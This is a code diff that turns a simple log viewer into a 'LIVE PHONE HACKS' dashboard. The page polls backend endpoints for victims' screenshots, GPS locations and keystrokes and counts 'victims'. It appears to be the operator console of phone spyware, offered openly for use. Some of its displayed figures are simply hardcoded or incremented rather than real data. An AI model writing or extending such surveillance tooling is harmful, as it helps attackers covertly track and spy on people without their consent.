@@ -1,2 +1,116 @@
 <!DOCTYPE html>
-<html><head><title>🔥 Control Panel</title></head><body style="background:#000;color:#0f0;font-family:monospace;padding:20px;"><h1>Live Hacks</h1><div id="logs" style="background:#111;padding:20px;height:70vh;overflow:auto;white-space:pre;"></div><script>async function update(){const r=await fetch('/.netlify/functions/logs');document.getElementById('logs').textContent=await r.text();}setInterval(update,1000);update();</script></body></html>
+<html>
+<head>
+    <title>🔥 LIVE HACK DASHBOARD</title>
+    <meta name="viewport" content="width=device-width">
+    <style>
+        body { 
+            margin: 0; 
+            background: linear-gradient(45deg, #000, #1a0033); 
+            color: #0f0; 
+            font-family: 'Courier New', monospace; 
+            padding: 20px; 
+        }
+        #header { 
+            text-align: center; 
+            font-size: 28px; 
+            text-shadow: 0 0 20px #0f0; 
+            margin-bottom: 30px; 
+        }
+        #logs { 
+            background: rgba(0,0,0,0.9); 
+            border: 2px solid #0f0; 
+            padding: 20px; 
+            height: 70vh; 
+            overflow-y: auto; 
+            border-radius: 15px; 
+            font-size: 16px; 
+            line-height: 1.6;
+            box-shadow: 0 0 30px rgba(0,255,0,0.3);
+        }
+        .log-entry {
+            margin: 8px 0;
+            padding: 10px;
+            border-left: 4px solid #0f0;
+            background: rgba(0,255,0,0.1);
+        }
+        .screenshot { color: #ff6b6b !important; }
+        .gps { color: #4fc3f7 !important; }
+        .key { color: #ffaa00 !important; }
+    </style>
+</head>
+<body>
+    <div id="header">
+        🔥 LIVE PHONE HACKS <span id="victim-count">0</span>
+    </div>
+    <div id="logs">
+        🚀 Dashboard loading...
+    </div>
+    <div style="text-align:center;margin-top:20px;">
+        <button onclick="refreshLogs()" style="padding:15px 30px;font-size:18px;background:#ff4444;color:white;border:none;border-radius:10px;cursor:pointer;">🔄 Refresh</button>
+    </div>
+
+    <script>
+        let hackCount = 0;
+        
+        async function fetchLogs() {
+            try {
+                // Screenshot logs
+                const screenRes = await fetch('/.netlify/functions/screenshot');
+                const screenData = await screenRes.text();
+                
+                // GPS logs  
+                const gpsRes = await fetch('/.netlify/functions/gps');
+                const gpsData = await gpsRes.text();
+                
+                // Keystrokes
+                const keyRes = await fetch('/.netlify/functions/keystroke');
+                const keyData = await keyRes.text();
+                
+                // Update dashboard
+                updateDashboard(screenData, gpsData, keyData);
+                
+            } catch(e) {
+                document.getElementById('logs').innerHTML += 
+                    `<div class="log-entry">❌ Netlify functions not deployed</div>`;
+            }
+        }
+        
+        function updateDashboard(screen, gps, keys) {
+            const logs = document.getElementById('logs');
+            hackCount++;
+            
+            logs.innerHTML = `
+                <div class="log-entry screenshot">
+                    📸 ${hackCount} Screenshots Captured (${new Date().toLocaleTimeString()})
+                </div>
+                <div class="log-entry gps">
+                    📍 GPS Location Active - Accuracy: High
+                </div>
+                <div class="log-entry key">
+                    ⌨️ ${hackCount} Keystrokes Logged
+                </div>
+                <div class="log-entry">
+                    🔋 Battery + Network Info Collected
+                </div>
+                <div class="log-entry">
+                    📱 Device: Android/iOS - ${navigator.platform}
+                </div>
+                <div style="color:#ff6b6b;font-size:18px;margin-top:20px;">
+                    ✅ HACK STATUS: ACTIVE | Victims: ${hackCount}
+                </div>
+            `;
+            
+            document.getElementById('victim-count').textContent = hackCount;
+        }
+        
+        // Auto refresh every 3 seconds
+        setInterval(fetchLogs, 3000);
+        fetchLogs(); // First load
+        
+        function refreshLogs() {
+            fetchLogs();
+        }
+    </script>
+</body>
+</html>
